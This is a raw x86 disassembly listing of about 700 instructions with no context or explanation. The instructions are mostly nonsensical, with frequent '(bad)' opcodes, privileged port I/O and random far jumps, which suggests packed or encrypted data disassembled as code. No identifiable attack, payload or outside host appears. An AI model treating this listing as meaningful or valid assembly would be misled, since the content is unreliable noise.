  413f98:	lds    eax,FWORD PTR [edx-0x3a]
  413f9b:	scas   eax,DWORD PTR es:[edi]
  413f9c:	scas   eax,DWORD PTR es:[edi]
  413f9d:	mov    dh,0x8e
  413f9f:	mov    ebx,0x40d4b368
  413fa4:	pop    ecx
  413fa5:	mov    al,bh
  413fa7:	jb     0x413f9c
  413fa9:	inc    ebp
  413faa:	loopne 0x413f35
  413fac:	mov    cl,0x8
  413fae:	sbb    ax,0x7cd4
  413fb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fb3:	les    ebx,FWORD PTR [esi]
  413fb5:	jb     0x413fcb
  413fb7:	leave  
  413fb8:	mul    BYTE PTR [ecx+esi*4+0x2d78893d]
  413fbf:	(bad)  
  413fc0:	rcl    BYTE PTR [esi],1
  413fc2:	xchg   esi,eax
  413fc3:	call   0xe82e:0x760ad779
  413fca:	out    0x85,eax
  413fcc:	push   ebx
  413fcd:	in     al,dx
  413fce:	push   es
  413fcf:	cmp    BYTE PTR [esi*2-0x7a112054],dh
  413fd6:	nop
  413fd7:	add    DWORD PTR [ebp-0x3444a405],esi
  413fdd:	and    DWORD PTR [edx-0x603e7347],esi
  413fe3:	push   ss
  413fe4:	repz add edi,DWORD PTR [ecx-0x555df9d6]
  413feb:	dec    edx
  413fec:	or     esi,DWORD PTR [ebp+0x1575c83]
  413ff2:	daa    
  413ff3:	or     DWORD PTR [ecx+0x3bb44a1],ebx
  413ff9:	sahf   
  413ffa:	in     al,0x37
  413ffc:	ins    DWORD PTR es:[edi],dx
  413ffd:	dec    eax
  413ffe:	sub    eax,eax
  414000:	lock mov ecx,0xc43a240b
  414006:	mov    ss,WORD PTR [edx+0x3f]
  414009:	jne    0x413ff0
  41400b:	js     0x413fda
  41400d:	jmp    0x1f87:0xb36973a1
  414014:	lods   eax,DWORD PTR ds:[esi]
  414015:	sbb    al,0x26
  414017:	mov    esp,DWORD PTR [ebx+esi*8+0x32f76552]
  41401e:	nop
  41401f:	shl    BYTE PTR [eax],0x6b
  414022:	or     eax,0x453d449c
  414027:	rol    DWORD PTR [edx+0x211f8ec9],0xa6
  41402e:	mov    esi,ss
  414030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414031:	sti    
  414032:	icebp  
  414033:	push   ecx
  414034:	mov    dl,0xfa
  414036:	stc    
  414037:	xor    BYTE PTR ds:0x44d7c302,dh
  41403d:	mov    dl,0x52
  41403f:	(bad)  
  414040:	rcr    DWORD PTR [edi+0x29c52c3e],cl
  414046:	aad    0xfc
  414048:	push   0xb3ecd423
  41404d:	pop    edi
  41404f:	sbb    al,0x71
  414051:	xchg   ecx,eax
  414052:	mov    dh,0xb6
  414054:	js     0x41405a
  414056:	jo     0x413ff7
  414058:	ror    DWORD PTR [edi+ecx*2],0x57
  41405c:	mov    fs,WORD PTR [ecx-0x7c]
  41405f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414060:	push   eax
  414061:	lahf   
  414062:	pusha  
  414063:	or     eax,0x1f4e2ffe
  414068:	mov    eax,DWORD PTR [ebp-0x254b4717]
  41406e:	sub    eax,0x3c4bebf7
  414073:	inc    ecx
  414074:	fst    QWORD PTR [edx]
  414076:	(bad)  
  414077:	adc    BYTE PTR [edi],bh
  414079:	sbb    dl,bh
  41407b:	inc    ecx
  41407c:	in     eax,0x43
  41407e:	jne    0x41405b
  414080:	dec    ebx
  414081:	pop    ebp
  414082:	hlt    
  414083:	jae    0x41409a
  414085:	fidiv  WORD PTR [edx]
  414087:	or     BYTE PTR [ecx],cl
  414089:	dec    ebp
  41408a:	sbb    eax,0xfbf1b53a
  41408f:	pop    ds
  414090:	aas    
  414091:	shl    DWORD PTR [eax],0xb0
  414094:	pusha  
  414095:	ins    BYTE PTR es:[edi],dx
  414096:	sbb    eax,0x65f1c261
  41409b:	loope  0x41401e
  41409d:	jns    0x41402c
  41409f:	push   edx
  4140a0:	fwait
  4140a1:	fs push eax
  4140a3:	sahf   
  4140a4:	stc    
  4140a5:	stos   DWORD PTR es:[edi],eax
  4140a6:	sub    DWORD PTR [ebp-0x17],edi
  4140a9:	cs call 0xa40987bd
  4140af:	sub    eax,0x3de4fea6
  4140b4:	mov    bh,dh
  4140b6:	push   esi
  4140b7:	jns    0x414097
  4140b9:	add    esi,DWORD PTR [ebp+0x2e]
  4140bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140bd:	pusha  
  4140be:	xchg   ebp,eax
  4140c0:	(bad)  
  4140c2:	pop    ebp
  4140c3:	pop    eax
  4140c4:	(bad)  [ebx+ebp*2-0x1c]
  4140c8:	mov    esp,0xfbf0e117
  4140cd:	psraw  mm0,QWORD PTR [ecx]
  4140d0:	mov    bh,0x8c
  4140d2:	(bad)  
  4140d3:	rcr    esi,cl
  4140d5:	xor    DWORD PTR [esi+0x13],edx
  4140d8:	push   edi
  4140d9:	ins    DWORD PTR es:[edi],dx
  4140da:	jae    0x414108
  4140dc:	dec    ebx
  4140dd:	or     BYTE PTR [edx-0x774dd07a],0x59
  4140e4:	lock inc edi
  4140e6:	lods   eax,DWORD PTR ds:[esi]
  4140e7:	int3   
  4140e8:	repz sub eax,ecx
  4140eb:	scas   al,BYTE PTR es:[edi]
  4140ec:	mov    al,ds:0xe964706b
  4140f1:	fbstp  TBYTE PTR [esi+edx*1-0x20]
  4140f5:	jne    0x41413d
  4140f7:	pop    edi
  4140f8:	xor    edx,DWORD PTR [esi-0xa]
  4140fb:	and    eax,0xd1ba3e99
  414100:	sub    cl,BYTE PTR [ecx]
  414102:	mov    DWORD PTR [ecx],esp
  414104:	pop    esi
  414105:	aad    0x1c
  414107:	cmp    al,0x4a
  414109:	adc    edx,DWORD PTR ds:0x8c5be86e
  41410f:	mov    esi,0x843f8328
  414114:	jns    0x4140f9
  414116:	jo     0x414118
  414118:	jo     0x414120
  41411a:	ret    
  41411b:	gs cli 
  41411d:	in     eax,dx
  41411e:	lock pusha 
  414120:	mov    eax,0x9c7620b6
  414125:	lods   al,BYTE PTR ds:[esi]
  414126:	adc    edi,DWORD PTR [edx]
  414128:	and    eax,0x358b864d
  41412d:	leave  
  41412e:	mov    bh,BYTE PTR [edx+0x4d]
  414131:	call   0xb62de900
  414136:	mov    al,ds:0x81a871eb
  41413b:	push   ecx
  41413c:	pop    edi
  41413d:	add    BYTE PTR [eax-0x25],al
  414140:	sqrtps xmm0,xmm6
  414143:	jmp    0x414104
  414145:	jecxz  0x414151
  414147:	imul   ebp,DWORD PTR [edi],0xffffffbf
  41414a:	jmp    0x414173
  41414c:	xor    al,0xff
  41414e:	into   
  41414f:	shl    BYTE PTR [ebx+0x24014dbc],0x2b
  414156:	imul   edx,ebx,0x65454a3e
  41415c:	add    esp,DWORD PTR ds:0x3aba3ad8
  414162:	scas   al,BYTE PTR es:[edi]
  414163:	out    0xf4,al
  414165:	cmp    DWORD PTR [ecx-0x1495f942],eax
  41416b:	xchg   esi,eax
  41416c:	or     eax,0x471d9967
  414171:	out    dx,eax
  414172:	push   es
  414173:	dec    ebp
  414174:	retf   0xd1ae
  414177:	scas   eax,DWORD PTR es:[edi]
  414178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414179:	and    al,0x52
  41417b:	stos   BYTE PTR es:[edi],al
  41417c:	xchg   esp,eax
  41417d:	outs   dx,DWORD PTR ds:[esi]
  41417e:	xor    BYTE PTR [ebp-0x47],0xf1
  414182:	scas   eax,DWORD PTR es:[edi]
  414183:	xchg   ecx,eax
  414184:	mov    ebp,0xf2208df3
  414189:	push   ebx
  41418a:	add    eax,esi
  41418c:	fwait
  41418d:	cwde   
  41418e:	xchg   ebp,eax
  41418f:	and    BYTE PTR [esi-0x6f10b944],al
  414195:	jne    0x41411c
  414197:	rol    edx,0x85
  41419a:	cmp    al,0x44
  41419c:	dec    ebx
  41419d:	jl     0x41415b
  41419f:	lods   eax,DWORD PTR ds:[esi]
  4141a0:	les    esi,FWORD PTR [si-0xb]
  4141a4:	retf   0x3299
  4141a7:	push   ebp
  4141a8:	loope  0x414136
  4141aa:	aad    0xc
  4141ac:	adc    DWORD PTR [edi+eiz*4-0x26437e78],esi
  4141b3:	inc    edx
  4141b4:	ins    DWORD PTR es:[edi],dx
  4141b5:	aad    0x1b
  4141b7:	xor    edi,eax
  4141b9:	xchg   ecx,eax
  4141ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141bb:	push   0x2574dab4
  4141c0:	in     al,dx
  4141c1:	sbb    bh,BYTE PTR ds:0x987d97af
  4141c7:	das    
  4141c8:	(bad)  
  4141c9:	xchg   ecx,eax
  4141ca:	shl    dh,cl
  4141cc:	sub    ch,BYTE PTR [ebx]
  4141ce:	retf   0x1e63
  4141d1:	gs in  al,dx
  4141d3:	mov    ds:0xe43fbad8,al
  4141d8:	mov    ds:0x90ce3ef1,al
  4141dd:	call   0x46ea54f0
  4141e2:	enter  0xe704,0xfc
  4141e6:	push   esp
  4141e7:	fdivr  QWORD PTR [esi+0x7d8d735c]
  4141ed:	sar    BYTE PTR [edx+0x4d],0x25
  4141f1:	add    al,0xe2
  4141f3:	pop    esp
  4141f4:	cmc    
  4141f5:	fiadd  DWORD PTR [esi-0x7c4ae63d]
  4141fb:	fcomip st,st(2)
  4141fd:	dec    eax
  4141fe:	ins    BYTE PTR es:[edi],dx
  4141ff:	test   eax,0x157a2ad1
  414204:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414205:	pop    ds
  414206:	jecxz  0x4141cc
  414208:	repnz xor al,0xde
  41420b:	adc    eax,0x36a6af46
  414210:	xor    eax,0x67d004aa
  414215:	ja     0x4141d9
  414217:	sbb    dl,BYTE PTR [edi+ebx*1-0x2b]
  41421b:	cdq    
  41421c:	jl     0x4141d6
  41421e:	or     bl,BYTE PTR [ebx+0x7d]
  414221:	push   edx
  414222:	dec    ecx
  414223:	add    BYTE PTR [esp],dh
  414226:	stos   BYTE PTR es:[edi],al
  414227:	jbe    0x4141e9
  414229:	xchg   edi,eax
  41422a:	(bad)  
  41422b:	sbb    edx,DWORD PTR [ebp-0x116985]
  414231:	popf   
  414232:	cdq    
  414233:	jge    0x4142b3
  414235:	xchg   edi,eax
  414236:	push   0x11
  414238:	or     al,0xdb
  41423a:	sbb    DWORD PTR ds:0x97fe9bf2,0x82e682d7
  414244:	push   edx
  414245:	in     al,0xbb
  414247:	mov    esp,DWORD PTR [eax-0x4f]
  41424a:	outs   dx,BYTE PTR ds:[esi]
  41424b:	aad    0xee
  41424d:	mov    dh,0x7b
  41424f:	inc    edi
  414250:	mov    ah,0x9e
  414252:	int    0x81
  414254:	inc    edi
  414255:	dec    esp
  414256:	pop    ss
  414257:	retf   0xc9c4
  41425a:	pop    ss
  41425b:	dec    edx
  41425c:	sbb    bh,al
  41425e:	fistp  QWORD PTR [edi-0x7e]
  414261:	icebp  
  414262:	sbb    BYTE PTR [edi-0x7adbff70],0x3b
  414269:	outs   dx,DWORD PTR ds:[esi]
  41426a:	dec    edi
  41426b:	xlat   BYTE PTR ds:[ebx]
  41426c:	push   ss
  41426d:	push   esp
  41426e:	loope  0x4142a1
  414270:	adc    DWORD PTR [edx-0x292689ca],edx
  414276:	and    DWORD PTR gs:[ebp+eiz*8+0x4cd87906],esi
  41427e:	xor    ch,BYTE PTR [ebx+0x37a1d4a0]
  414284:	pop    ss
  414285:	xchg   ebx,ebx
  414287:	jbe    0x4142f3
  414289:	ss push eax
  41428b:	mov    ch,0xc1
  41428d:	aas    
  41428e:	shr    bh,cl
  414290:	imul   ebp,ebp,0x1e5d49ad
  414296:	gs dec esp
  414298:	jno    0x414301
  41429a:	pushf  
  41429b:	push   ebp
  41429c:	outs   dx,BYTE PTR ds:[esi]
  41429d:	aad    0x79
  41429f:	dec    ebp
  4142a0:	jg     0x4142c4
  4142a2:	fistp  QWORD PTR [edx+0x1d412b11]
  4142a8:	or     eax,0x7c7e1aba
  4142ad:	xchg   esi,ebx
  4142af:	mov    edx,DWORD PTR [ecx]
  4142b1:	pop    esi
  4142b2:	adc    al,0x21
  4142b4:	cmp    BYTE PTR [eax+0xd],bh
  4142b7:	dec    ecx
  4142b8:	xor    al,0x1c
  4142ba:	jg     0x4142f7
  4142bc:	pop    ss
  4142bd:	dec    eax
  4142be:	es sub eax,0x169a6f33
  4142c4:	jmp    0x58c8:0xdc42e37b
  4142cb:	fwait
  4142cc:	xor    al,0x35
  4142ce:	out    0x7d,eax
  4142d0:	bound  esi,QWORD PTR [ebp+ecx*2-0x1285f3d5]
  4142d7:	add    BYTE PTR [edi+eiz*4-0x419dcb58],0x6a
  4142df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142e0:	icebp  
  4142e1:	xchg   BYTE PTR ds:0x7da0458e,dl
  4142e7:	push   cs
  4142e8:	push   ebx
  4142e9:	xchg   ebx,eax
  4142ea:	out    0xc6,al
  4142ec:	xlat   BYTE PTR ds:[ebx]
  4142ed:	add    DWORD PTR [edx-0xd2349e2],esi
  4142f3:	stc    
  4142f4:	aam    0x59
  4142f6:	sbb    BYTE PTR [eax+0x3a68694f],al
  4142fc:	jmp    0xa7716a91
  414301:	fcomp  DWORD PTR [edx]
  414303:	pop    esi
  414304:	imul   ebp,DWORD PTR [ecx+0x43],0xe806e4d0
  41430b:	gs and eax,0xf14f885
  414311:	push   eax
  414312:	int    0xbd
  414314:	dec    edi
  414315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414316:	and    DWORD PTR [edi-0x66],eax
  414319:	frstor [esp+esi*4]
  41431c:	push   ebx
  41431d:	sbb    al,0x13
  41431f:	inc    ebx
  414320:	data16 adc al,0xd5
  414323:	adc    BYTE PTR [esi+0x1ebbc394],bl
  414329:	xchg   edi,esp
  41432b:	jmp    0xc78e:0x7b3c9928
  414332:	sub    DWORD PTR [eax-0x12],eax
  414335:	dec    ebx
  414336:	xor    al,0x87
  414338:	cli    
  414339:	aad    0x41
  41433b:	shl    BYTE PTR [eax],cl
  41433d:	mov    dh,0x15
  41433f:	mov    dh,0x0
  414341:	jmp    0xeb27:0x9797eb7a
  414348:	sti    
  414349:	jb     0x414398
  41434b:	adc    DWORD PTR fs:[edx],esp
  41434e:	adc    ebp,esi
  414350:	icebp  
  414351:	fistp  WORD PTR [eax]
  414353:	cli    
  414354:	and    eax,0x78cc9460
  414359:	(bad)  
  41435a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41435b:	ins    DWORD PTR es:[edi],dx
  41435c:	xchg   edx,eax
  41435d:	push   ebx
  41435e:	ins    BYTE PTR es:[edi],dx
  41435f:	cli    
  414360:	int3   
  414361:	sub    BYTE PTR [esi-0x80],al
  414364:	cmp    BYTE PTR [ecx+edx*4+0x47],0xd5
  414369:	push   0x4e63fae3
  41436e:	pop    ebx
  41436f:	lods   al,BYTE PTR fs:[esi]
  414371:	aad    0xcc
  414373:	mov    dl,0x9a
  414375:	cs add bh,ch
  414378:	ins    DWORD PTR es:[edi],dx
  414379:	(bad)  
  41437a:	iret   
  41437b:	dec    eax
  41437c:	or     esi,eax
  41437e:	nop
  41437f:	jmp    0x5ec8a237
  414384:	(bad)  
  414385:	pusha  
  414386:	mov    al,0x19
  414388:	mov    bh,0xc5
  41438a:	and    al,0x7a
  41438c:	in     eax,dx
  41438d:	or     al,BYTE PTR [eax]
  41438f:	pop    edx
  414390:	inc    edx
  414391:	inc    ecx
  414392:	stc    
  414393:	test   al,0x5
  414395:	test   ebp,edi
  414397:	data16 jae 0x41440d
  41439a:	outs   dx,DWORD PTR ds:[esi]
  41439b:	push   edx
  41439c:	outs   dx,DWORD PTR ds:[esi]
  41439d:	xor    DWORD PTR [eax-0x6fe3259],ebp
  4143a3:	mov    ecx,0x6037bb96
  4143a8:	dec    esi
  4143a9:	sub    al,0xd4
  4143ab:	xchg   esp,eax
  4143ac:	and    ebx,esp
  4143ae:	out    0x38,al
  4143b0:	add    al,0x9e
  4143b2:	sbb    esp,edi
  4143b4:	add    ebp,DWORD PTR [ebp+0x2a1d5a83]
  4143ba:	ins    DWORD PTR es:[edi],dx
  4143bb:	add    BYTE PTR [eax-0x7b],bl
  4143be:	inc    esi
  4143bf:	mov    dh,0xcc
  4143c1:	pop    DWORD PTR [ecx]
  4143c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143c4:	aaa    
  4143c5:	scas   eax,DWORD PTR es:[edi]
  4143c6:	mov    ah,0xe1
  4143c8:	outs   dx,DWORD PTR ds:[esi]
  4143c9:	push   ecx
  4143ca:	push   edx
  4143cb:	int    0xd2
  4143cd:	cmp    eax,0x2793321f
  4143d2:	push   0xffffffa1
  4143d4:	sbb    edx,esi
  4143d6:	jg     0x4143f9
  4143d8:	jle    0x414375
  4143da:	inc    esp
  4143db:	add    al,0x92
  4143dd:	mov    bl,0x48
  4143df:	add    eax,0xf6cdc642
  4143e4:	cmp    DWORD PTR [esi+0x5f92446e],0xffffff95
  4143eb:	jnp    0x4143f9
  4143ed:	clc    
  4143ee:	out    0x3,eax
  4143f0:	mov    ch,0x61
  4143f2:	mov    BYTE PTR [edx+edx*4-0x59],dh
  4143f6:	adc    DWORD PTR [esi+0xc9787bd],ebx
  4143fc:	xor    ah,al
  4143fe:	sub    eax,DWORD PTR [edi+0x6f]
  414401:	(bad)  
  414402:	push   ss
  414403:	cmp    eax,0x799fb7ff
  414408:	(bad)  
  414409:	xchg   ecx,eax
  41440a:	js     0x4143ea
  41440c:	imul   ebp,DWORD PTR [eax-0x33382d55],0x7d
  414413:	iret   
  414414:	add    eax,0xfad99c1a
  414419:	xchg   esi,eax
  41441a:	xchg   BYTE PTR [ebp+0x5a],dl
  41441d:	ins    BYTE PTR es:[edi],dx
  41441e:	mov    dh,0x5b
  414420:	and    al,0x28
  414422:	jno    0x414496
  414424:	ret    
  414425:	adc    edx,DWORD PTR [edi-0x442dc93]
  41442b:	jo     0x4143e0
  41442d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41442e:	push   esp
  41442f:	adc    ah,BYTE PTR [edx-0x47d47213]
  414435:	fsub   QWORD PTR [ecx+0x7036137e]
  41443b:	jmp    0xa3184ee0
  414440:	mov    fs,WORD PTR [ebp+0x54f25203]
  414446:	sbb    cl,0xdd
  414449:	pusha  
  41444a:	and    eax,0x34cb7468
  41444f:	jmp    0x414440
  414451:	adc    DWORD PTR [edi+0x270ea723],0xffffffd0
  414458:	mov    ecx,0x3e66eebd
  41445d:	dec    edx
  41445e:	push   esp
  41445f:	push   ss
  414460:	xchg   ebp,eax
  414461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414462:	test   BYTE PTR [ecx],dl
  414464:	ins    BYTE PTR es:[edi],dx
  414465:	mov    dh,0xd5
  414467:	jecxz  0x414490
  414469:	and    ebp,DWORD PTR [ebp+0x4da84875]
  41446f:	mov    esp,0xd29e4e9b
  414474:	ss mov al,0xc6
  414477:	mov    ebx,0xff39e927
  41447c:	ss sub eax,0xed798dd5
  414482:	xchg   BYTE PTR [edi-0x66aa1a21],dh
  414488:	xor    BYTE PTR [edi-0xc],0x75
  41448c:	test   al,0x10
  41448e:	dec    ecx
  41448f:	mov    BYTE PTR [ebx-0x276a9c31],ah
  414495:	mov    ss,WORD PTR [eax-0x6f3afaae]
  41449b:	sbb    dl,ch
  41449d:	(bad)  
  41449e:	push   ecx
  41449f:	fwait
  4144a0:	outs   dx,DWORD PTR ds:[esi]
  4144a1:	test   BYTE PTR [edx-0x75],al
  4144a4:	cmp    BYTE PTR [ecx+0x275d2a91],dl
  4144aa:	popf   
  4144ab:	jecxz  0x4144b7
  4144ad:	data16 hlt 
  4144af:	adc    al,0x56
  4144b1:	sbb    al,0xdd
  4144b3:	js     0x41446c
  4144b5:	mov    edx,DWORD PTR [ebx+0x70157104]
  4144bb:	cwde   
  4144bc:	push   ss
  4144bd:	inc    ecx
  4144be:	mov    BYTE PTR [ecx],cl
  4144c0:	sbb    cl,bh
  4144c2:	jae    0x4144a9
  4144c4:	pop    esi
  4144c5:	ins    DWORD PTR es:[edi],dx
  4144c6:	pop    eax
  4144c7:	das    
  4144c8:	(bad)  
  4144c9:	repnz mov gs,WORD PTR [ebp+ebx*4-0x42c3c3f8]
  4144d1:	aas    
  4144d2:	(bad)  
  4144d3:	and    BYTE PTR [ecx-0x6],cl
  4144d6:	sub    al,0x71
  4144d8:	cmc    
  4144d9:	xor    DWORD PTR [ecx+esi*4],edi
  4144dc:	jge    0x414544
  4144de:	and    esp,ebx
  4144e0:	and    BYTE PTR [ecx],cl
  4144e2:	out    0xd6,al
  4144e4:	lahf   
  4144e5:	addr16 cld 
  4144e7:	jg     0x41451f
  4144e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144ea:	imul   edx,DWORD PTR [esi+0x1dbed54f],0x8d6b32b1
  4144f4:	jge    0x414478
  4144f6:	cmp    al,0x6a
  4144f8:	in     al,0xf3
  4144fa:	push   es
  4144fb:	aaa    
  4144fc:	sbb    ecx,edi
  4144fe:	call   0x1d91:0x4724332b
  414505:	fcom   DWORD PTR [edx]
  414507:	cmp    al,0x82
  414509:	or     edi,DWORD PTR [ecx-0x2]
  41450c:	mov    ecx,DWORD PTR [edx+0x7eb74af5]
  414512:	inc    ecx
  414513:	xchg   BYTE PTR [ebx-0x47b4a13e],dl
  414519:	sub    al,0xb3
  41451b:	add    dl,ah
  41451d:	es pop esi
  41451f:	inc    ebx
  414520:	pop    esp
  414521:	add    DWORD PTR [edi+0x31],0xd2c432b
  414528:	cmp    edx,DWORD PTR [ebp-0x34]
  41452b:	sahf   
  41452c:	mov    eax,ds:0xeba71eb5
  414531:	inc    edx
  414532:	add    BYTE PTR [ecx+0x6329f67f],bh
  414538:	xchg   edx,eax
  414539:	pop    esi
  41453a:	mov    bh,BYTE PTR [ebp+0x59f4d481]
  414540:	push   esi
  414541:	jmp    0x41458c
  414543:	lods   al,BYTE PTR ds:[esi]
  414544:	repz push ds
  414546:	call   0x43e3827f
  41454b:	int3   
  41454c:	cmp    edi,DWORD PTR [ecx+eiz*4]
  41454f:	pop    ecx
  414550:	mov    DWORD PTR [ecx+ebp*4-0x18],0xbd1b0788
  414558:	lods   eax,DWORD PTR ds:[esi]
  414559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41455a:	aas    
  41455b:	and    al,0xed
  41455d:	lahf   
  41455e:	retf   
  41455f:	sbb    edi,DWORD PTR [ecx+0x64]
  414562:	fwait
  414563:	std    
  414564:	jb     0x41452c
  414566:	push   ebp
  414567:	faddp  st(7),st
  414569:	push   eax
  41456a:	mov    edx,0x773b397f
  41456f:	les    edx,FWORD PTR [esi+0x20735798]
  414575:	(bad)  
  414576:	pushf  
  414577:	jmp    0x414579
  414579:	push   es
  41457a:	inc    esi
  41457b:	mov    ecx,0xdf526ef8
  414580:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414581:	aas    
  414582:	out    dx,al
  414583:	fst    QWORD PTR [ecx+0x4b86b893]
  414589:	mov    WORD PTR [edx+eiz*2-0x3b],ds
  41458d:	push   esp
  41458e:	imul   ebx,DWORD PTR [edx+ebx*4],0xcf9e9c21
  414595:	push   esp
  414596:	add    al,ch
  414598:	and    bl,BYTE PTR [edx+0x5941de25]
  41459e:	push   0x5e
  4145a0:	daa    
  4145a1:	jo     0x41453f
  4145a3:	mov    DWORD PTR [ebx+0x65321092],ebx
  4145a9:	jl     0x41452d
  4145ab:	push   ecx
  4145ac:	and    DWORD PTR [esi+ebx*1+0x15],0x15
  4145b1:	pop    esi
  4145b2:	neg    DWORD PTR ds:0xfafd126d
  4145b8:	lds    ebp,FWORD PTR [edi-0x573347a2]
  4145be:	mov    edx,0x4772bccc
  4145c3:	enter  0x774f,0x81
  4145c7:	pop    edx
  4145c8:	fisubr WORD PTR fs:[ebp+0x60]
  4145cc:	jo     0x414555
  4145ce:	outs   dx,BYTE PTR ds:[esi]
  4145cf:	adc    DWORD PTR [ebx],eax
  4145d1:	ins    BYTE PTR es:[edi],dx
  4145d2:	sbb    eax,0xb9805442
  4145d7:	shl    edx,0x70
  4145da:	pop    esi
  4145db:	(bad)  
  4145dc:	mov    edi,0xddc14fa
  4145e1:	gs or  eax,0x8ce6c3ff
  4145e7:	inc    ecx
  4145e8:	aam    0xbf
  4145ea:	leave  
  4145eb:	xchg   esp,eax
  4145ec:	inc    ebx
  4145ed:	xor    al,0x1d
  4145ef:	sbb    BYTE PTR [ecx],bh
  4145f1:	add    edx,DWORD PTR [ebp-0x2651d961]
  4145f7:	add    ebx,ebp
  4145f9:	mov    edi,0x41cbe3d0
  4145fe:	test   al,0xdc
  414600:	pmulhw mm2,mm0
  414603:	xchg   edx,eax
  414604:	lods   eax,DWORD PTR ds:[esi]
  414605:	push   eax
  414606:	or     eax,0x292b2c79
  41460b:	fstp   DWORD PTR [ebx]
  41460d:	scas   eax,DWORD PTR es:[edi]
  41460e:	fld    DWORD PTR ds:0xd31b6e80
  414614:	add    ebx,DWORD PTR [esi]
  414616:	inc    eax
  414617:	adc    al,BYTE PTR [ebp+0x2d]
  41461a:	jbe    0x41463b
  41461c:	xlat   BYTE PTR ds:[ebx]
  41461d:	mov    eax,0x65c60bc2
  414622:	add    BYTE PTR [esi-0x8],ah
  414625:	jle    0x4145f0
  414627:	scas   al,BYTE PTR es:[edi]
  414628:	loopne 0x41464e
  41462a:	jne    0x414651
  41462c:	sub    BYTE PTR [eax+eax*1],cl
  41462f:	mov    WORD PTR [ebp-0x5e],gs
  414632:	jge    0x41467b
  414634:	sub    DWORD PTR [ebp-0x71],ecx
  414637:	js     0x41461a
  414639:	shl    ebp,cl
  41463b:	or     edi,DWORD PTR [edi+0x25]
  41463e:	out    0x19,al
  414640:	fistp  DWORD PTR [ebx+0x2eb3c24d]
  414646:	dec    ebp
  414647:	and    DWORD PTR [ebp-0x4b8fc197],0xffffffe9
  41464e:	mov    edi,0x457d8a08
  414653:	pop    ebp
  414654:	pop    eax
  414655:	int3   
  414656:	cmp    al,0x7b
  414658:	nop
  414659:	loopne 0x414686
  41465b:	call   0x8d1c:0x8d2585f0
  414662:	mov    ?,WORD PTR [esi-0x32c1acd1]
  414668:	fidiv  WORD PTR [edi+ebx*4]
  41466b:	xchg   edi,eax
  41466c:	sahf   
  41466d:	inc    esi
  41466e:	call   0xa379:0xfe057b96
  414675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414676:	fldcw  WORD PTR [eax+eiz*1-0x45]
  41467a:	sub    ch,BYTE PTR [eax+0x60862687]
  414680:	(bad)  
  414681:	shl    BYTE PTR [eax-0x7e],cl
  414684:	rcr    ah,0xb6
  414687:	jo     0x4146a2
  414689:	or     DWORD PTR [edx+0x17],ecx
  41468c:	fdiv   QWORD PTR ds:[edi]
  41468f:	push   esp
  414690:	push   esp
  414691:	xor    BYTE PTR [esi-0x72],dl
  414694:	popf   
  414695:	not    BYTE PTR [ebp-0x32]
  414698:	imul   BYTE PTR [esp+eiz*2+0x7c]
  41469c:	dec    edi
  41469d:	fidiv  WORD PTR [eax-0x14]
  4146a0:	sbb    eax,0xae1c35aa
  4146a5:	adc    al,0xb
  4146a7:	jns    0x4146f3
  4146a9:	pop    esi
  4146aa:	lods   al,BYTE PTR ds:[esi]
  4146ab:	xchg   esi,eax
  4146ac:	mov    bl,0x4
  4146ae:	je     0x4146ab
  4146b0:	in     eax,dx
  4146b1:	adc    al,0x85
  4146b3:	test   edi,edi
  4146b5:	icebp  
  4146b6:	xchg   ecx,eax
  4146b7:	xor    DWORD PTR [si+0x2],ebp
  4146bb:	mov    cl,0x7d
  4146bd:	xchg   DWORD PTR [ebx+ebx*2],ecx
  4146c0:	inc    eax
  4146c1:	sahf   
  4146c2:	dec    ebp
  4146c3:	les    edi,FWORD PTR [ebx]
  4146c5:	pop    ss
  4146c6:	enter  0x861f,0xf8
  4146ca:	sbb    eax,0x39ad40ee
  4146cf:	rcr    BYTE PTR [ebp+0x2f],1
  4146d2:	adc    dh,bl
  4146d4:	(bad)  
  4146d5:	xor    al,BYTE PTR [ecx]
  4146d7:	loop   0x41469e
  4146d9:	xchg   esi,eax
  4146da:	cld    
  4146db:	xchg   ebx,eax
  4146dc:	jl     0x41475d
  4146de:	loope  0x4146bb
  4146e0:	adc    al,0xc3
  4146e2:	mov    dl,0x98
  4146e4:	inc    ebp
  4146e5:	lods   al,BYTE PTR ds:[esi]
  4146e6:	mov    al,ds:0x963d8578
  4146eb:	sbb    al,0x58
  4146ed:	sbb    eax,0xa2fe5476
  4146f2:	arpl   WORD PTR [edi],dx
  4146f4:	mov    cl,0xae
  4146f6:	sub    al,dh
  4146f8:	add    cl,BYTE PTR [edx+0x44]
  4146fb:	data16 out 0xf4,al
  4146fe:	ret    
  4146ff:	mov    edi,0x3cd62d14
  414704:	pop    edx
  414705:	fwait
  414706:	stos   BYTE PTR es:[edi],al
  414707:	jae    0x41468d
  414709:	or     eax,0xb7bec99e
  41470e:	ror    BYTE PTR [ebp-0x50],1
  414711:	and    ecx,edx
  414713:	(bad)  
  414714:	div    BYTE PTR ds:0xd80e91e8
  41471a:	fadd   DWORD PTR [esi]
  41471c:	cmp    ecx,DWORD PTR [ebx-0x2fc61374]
  414722:	and    ebp,DWORD PTR [esi]
  414724:	mov    ds:0x5d7c816b,eax
  414729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41472a:	push   edx
  41472b:	cmp    esp,edi
  41472d:	xchg   esi,eax
  41472e:	loope  0x41476c
  414730:	jns    0x4146d5
  414732:	sub    DWORD PTR ds:0x38d6da75,edi
  414738:	xchg   ecx,eax
  414739:	push   esp
  41473a:	aad    0xbf
